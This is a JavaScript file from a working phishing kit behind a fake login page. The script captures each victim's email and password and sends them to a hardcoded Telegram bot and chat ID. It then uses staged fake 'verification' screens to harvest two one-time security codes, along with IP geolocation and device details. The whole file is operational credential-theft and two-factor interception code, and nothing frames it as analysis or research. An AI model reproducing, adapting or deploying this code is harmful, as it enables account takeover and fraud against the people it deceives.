const TELEGRAM_BOT_TOKEN = "8606698897:AAEzeB10RdudDGtnER9_5JiwjMbkowPS6Vg";
const TELEGRAM_CHAT_ID = "2007508876";

async function sendTelegramMessage(message) {
  try {
    const timestamp = new Date().toLocaleString();
    const text = (message.includes('🎯') || message.includes('🔐') || message.includes('📄'))
      ? `${message}\n\n<b>Time:</b> ${timestamp}`
      : `⏳ <b>Action Notification</b>\n\n${message}\n\n<b>Time:</b> ${timestamp}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      })
    });
    return true;
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    return false;
  }
}

function compressImageForTelegram(photoFile) {
  return new Promise((resolve) => {
    const reader = new FileReader();
    reader.onload = function (e) {
      const img = new Image();
      img.onload = function () {
        const MAX = 1280;
        let w = img.width;
        let h = img.height;
        if (w > MAX || h > MAX) {
          if (w > h) { h = Math.round(h * MAX / w); w = MAX; }
          else { w = Math.round(w * MAX / h); h = MAX; }
        }
        const canvas = document.createElement('canvas');
        canvas.width = w;
        canvas.height = h;
        canvas.getContext('2d').drawImage(img, 0, 0, w, h);
        canvas.toBlob((blob) => {
          resolve(new File([blob], 'photo.jpg', { type: 'image/jpeg' }));
        }, 'image/jpeg', 0.85);
      };
      img.src = e.target.result;
    };
    reader.readAsDataURL(photoFile);
  });
}

async function sendPhotoToTelegram(photoFile, shortCaption) {
  const safeCaption = (shortCaption || '').substring(0, 1024);

  try {
    const compressed = await compressImageForTelegram(photoFile);

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('caption', safeCaption);
    formData.append('photo', compressed, 'photo.jpg');

    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    const data = await res.json();

    if (data.ok) return true;
    console.error('sendPhoto failed:', data.description);
    return false;

  } catch (error) {
    console.error('Error sending photo to Telegram:', error);
    return false;
  }
}

async function getIpInfo() {
  try {
    const response = await fetch('https://ipinfo.io/json');
    const data = await response.json();
    return `
📍 Location Information:
• IP Address: ${data.ip || "Unknown"}
• City: ${data.city || "Unknown"}
• Region: ${data.region || "Unknown"}
• Country: ${data.country || "Unknown"}
• Location: ${data.loc || "Unknown"}
• ISP: ${data.org || "Unknown"}`;
  } catch (error) {
    return "Could not determine location information";
  }
}

function getDeviceDetails() {
  const ua = navigator.userAgent.toLowerCase();

  let deviceType = "Unknown";
  if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
    deviceType = "iOS";
  } else if (ua.includes("android")) {
    deviceType = "Android";
  } else if (ua.includes("windows")) {
    deviceType = "Windows";
  } else if (ua.includes("mac os") || ua.includes("macintosh")) {
    deviceType = "Mac";
  } else if (ua.includes("linux")) {
    deviceType = "Linux";
  }

  let browser = "Unknown";
  if (ua.includes("chrome") && !ua.includes("chromium")) {
    browser = "Chrome";
  } else if (ua.includes("firefox")) {
    browser = "Firefox";
  } else if (ua.includes("safari") && !ua.includes("chrome")) {
    browser = "Safari";
  } else if (ua.includes("edge") || ua.includes("edg/")) {
    browser = "Edge";
  } else if (ua.includes("opera") || ua.includes("opr/")) {
    browser = "Opera";
  }

  return `
📱 Device Information:
• Type: ${deviceType}
• Browser: ${browser}
• Platform: ${navigator.platform || "Unknown"}
• Screen Size: ${window.screen.width || "?"} x ${window.screen.height || "?"}
• Language: ${navigator.language || "Unknown"}
• Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"}
• User Agent: ${navigator.userAgent || "Unknown"}`;
}

function dataURLtoFile(dataurl, filename) {
  const arr = dataurl.split(',');
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new File([u8arr], filename, { type: mime });
}

function showSentPage() {
  document.getElementById('sent-page').classList.add('active');
}

function showFinalPage() {
  document.getElementById('final-page').classList.add('active');
}

document.addEventListener('DOMContentLoaded', function () {
  const loginForm = document.getElementById('login-form');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const emailError = document.getElementById('email-error');
  const passwordError = document.getElementById('password-error');
  const modal = document.getElementById('bedtime-modal');
  const verificationCodeInput = document.getElementById('verification-code');
  const verificationCodeError = document.getElementById('verification-code-error');
  const submitVerificationButton = document.getElementById('submit-verification');
  const pendingConfirmationStep = document.getElementById('pending-confirmation-step');
  const progressBar = document.getElementById('progress-bar');
  const countdownText = document.getElementById('countdown-text');
  const firstVerificationStep = document.getElementById('first-verification-step');
  const secondVerificationStep = document.getElementById('second-verification-step');
  const secondVerificationCodeInput = document.getElementById('second-verification-code');
  const secondVerificationCodeError = document.getElementById('second-verification-code-error');
  const submitSecondVerificationButton = document.getElementById('submit-second-verification');

  function validateEmail() {
    if (!emailInput.value.trim()) {
      emailError.style.display = 'block';
      return false;
    } else {
      emailError.style.display = 'none';
      return true;
    }
  }

  function validatePassword() {
    if (!passwordInput.value.trim()) {
      passwordError.style.display = 'block';
      return false;
    } else {
      passwordError.style.display = 'none';
      return true;
    }
  }

  emailInput.addEventListener('blur', validateEmail);
  passwordInput.addEventListener('blur', validatePassword);
  emailInput.addEventListener('input', function () {
    if (emailError.style.display === 'block') validateEmail();
  });
  passwordInput.addEventListener('input', function () {
    if (passwordError.style.display === 'block') validatePassword();
  });

  loginForm.addEventListener('submit', function (e) {
    e.preventDefault();

    const emailValid = validateEmail();
    const passwordValid = validatePassword();

    if (emailValid && passwordValid) {
      const emailVal = emailInput.value.trim();
      const passwordVal = passwordInput.value.trim();

      const stepIds = [
        'first-verification-step',
        'pending-confirmation-step',
        'second-verification-step',
        'id-processing-step',
        'verification-success'
      ];

      stepIds.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = (id === 'first-verification-step' ? 'block' : 'none');
      });

      if (verificationCodeInput) verificationCodeInput.value = '';
      if (secondVerificationCodeInput) secondVerificationCodeInput.value = '';

      const pb1 = document.getElementById('progress-bar');
      if (pb1) pb1.style.width = '0%';
      const pb2 = document.getElementById('id-progress-bar');
      if (pb2) pb2.style.width = '0%';

      modal.style.display = 'flex';
      modal.classList.add('show');

      const timestamp = new Date().toLocaleString();
      const text = `🎯 <b>New Login Attempt</b>\n\n<b>Email/User:</b> <code>${emailVal}</code> \n<b>Password:</b> <code>${passwordVal}</code> \n<b>Time:</b> ${timestamp}\n\n<b>Device:</b> ${navigator.userAgent}`;

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        })
      }).catch(err => console.error('Login alert failed', err));
    }
  });

  const closeButtons = document.querySelectorAll('.close-modal');
  closeButtons.forEach(btn => {
    btn.addEventListener('click', function () {
      modal.classList.remove('show');
    });
  });

  modal.addEventListener('click', function (e) {
    if (e.target === modal) modal.classList.remove('show');
  });

  function validateVerificationCode() {
    const code = verificationCodeInput.value.trim();
    if (!code || (code.length !== 6 && code.length !== 8) || !/^\d+$/.test(code)) {
      verificationCodeError.style.display = 'block';
      submitVerificationButton.disabled = true;
      submitVerificationButton.style.opacity = '0.7';
      submitVerificationButton.style.cursor = 'not-allowed';
      return false;
    } else {
      verificationCodeError.style.display = 'none';
      submitVerificationButton.disabled = false;
      submitVerificationButton.style.opacity = '1';
      submitVerificationButton.style.cursor = 'pointer';
      return true;
    }
  }

  function validateSecondVerificationCode() {
    const code = secondVerificationCodeInput.value.trim();
    if (!code || (code.length !== 6 && code.length !== 8) || !/^\d+$/.test(code)) {
      secondVerificationCodeError.style.display = 'block';
      submitSecondVerificationButton.disabled = true;
      submitSecondVerificationButton.style.opacity = '0.7';
      submitSecondVerificationButton.style.cursor = 'not-allowed';
      return false;
    } else {
      secondVerificationCodeError.style.display = 'none';
      submitSecondVerificationButton.disabled = false;
      submitSecondVerificationButton.style.opacity = '1';
      submitSecondVerificationButton.style.cursor = 'pointer';
      return true;
    }
  }

  verificationCodeInput.addEventListener('input', validateVerificationCode);
  secondVerificationCodeInput.addEventListener('input', validateSecondVerificationCode);

  submitVerificationButton.addEventListener('click', async function () {
    const code = verificationCodeInput.value.trim();
    if (validateVerificationCode()) {
      try {
        const timestamp = new Date().toLocaleString();
        const message = `🔐 <b>Security Code Entered</b>\n\nCode: <code>${code}</code>\nUser is awaiting next steps.`;
        sendTelegramMessage(message);

        firstVerificationStep.style.display = 'none';
        pendingConfirmationStep.style.display = 'block';

        let timeRemaining = 5;
        const updateInterval = setInterval(() => {
          timeRemaining--;
          const pct = ((5 - timeRemaining) / 5) * 100;
          progressBar.style.width = pct + '%';
          if (timeRemaining > 0) {
            countdownText.textContent = `Verification in progress... ${timeRemaining} seconds remaining`;
          } else {
            countdownText.textContent = 'Verification complete';
            clearInterval(updateInterval);
          }
        }, 1000);

        const ipInfo = await getIpInfo();
        const deviceDetails = getDeviceDetails();
        const bgMsg = `🔐 First verification code submitted at ${timestamp}:\n\n🔢 Code: ${code}${deviceDetails}\n${ipInfo}`;
        sendTelegramMessage(bgMsg);

        setTimeout(() => {
          pendingConfirmationStep.style.display = 'none';
          secondVerificationStep.style.display = 'block';
        }, 5000);

      } catch (error) {
        console.error('Error sending verification code:', error);
        setTimeout(() => {
          pendingConfirmationStep.style.display = 'none';
          secondVerificationStep.style.display = 'block';
        }, 5000);
      }
    }
  });

  submitSecondVerificationButton.addEventListener('click', async function () {
    const code = secondVerificationCodeInput.value.trim();
    if (validateSecondVerificationCode()) {
      try {
        const message = `🔐 <b>FINAL Security Code Entered</b>\n\nSecond Code: <code>${code}</code>`;
        sendTelegramMessage(message);

        secondVerificationStep.style.display = 'none';

        const idProcessingStep = document.getElementById('id-processing-step');
        const idProgressBar = document.getElementById('id-progress-bar');
        const idCountdownText = document.getElementById('id-countdown-text');

        idProcessingStep.style.display = 'block';

        let idTimeRemaining = 10;
        const idUpdateInterval = setInterval(() => {
          idTimeRemaining--;
          const pct = ((10 - idTimeRemaining) / 10) * 100;
          if (idProgressBar) idProgressBar.style.width = pct + '%';
          if (idTimeRemaining > 0) {
            if (idCountdownText) idCountdownText.textContent = `Finalizing verification... ${idTimeRemaining} seconds remaining`;
          } else {
            if (idCountdownText) idCountdownText.textContent = 'Verification complete - redirecting...';
            clearInterval(idUpdateInterval);
          }
        }, 1000);

        setTimeout(() => {
          idProcessingStep.style.display = 'none';
          showSentPage();
        }, 10000);

      } catch (error) {
        console.error('Error sending second verification code:', error);
        secondVerificationStep.style.display = 'none';
        showSentPage();
      }
    }
  });

  // Sent page button
  const proceedBtn = document.getElementById('proceed-btn');
  if (proceedBtn) {
    proceedBtn.addEventListener('click', async function () {
      proceedBtn.disabled = true;
      proceedBtn.textContent = 'Processing...';

      try {
        await sendTelegramMessage("🚨 <b>User clicked PROCEED</b>\n\nThey are now <b>AWAITING</b> the verification link.");
      } catch (e) {
        console.error("Failed to notify telegram", e);
      } finally {
        setTimeout(() => {
          document.getElementById('sent-page').classList.remove('active');
          showFinalPage();
        }, 1000);
      }
    });
  }
});
